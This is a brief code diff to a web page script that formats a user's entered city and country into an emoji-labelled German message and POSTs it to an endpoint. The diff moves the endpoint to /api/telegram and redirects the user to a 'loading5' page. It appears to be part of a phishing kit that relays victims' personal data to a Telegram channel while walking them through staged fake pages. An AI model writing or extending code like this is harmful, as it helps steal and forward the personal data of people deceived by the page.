@@ -701,13 +701,13 @@ const msg =
   `🚈 Stadt: ${city}\n` +
   `🌍 Land: ${country}\n`
 
-  await fetch("/api/adresse", {
+  await fetch("/api/telegram", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ message: msg })
   });
 
-  window.location.href = "id.html";
+  window.location.href = "loading5.html";
 });
 </script>
 </body>
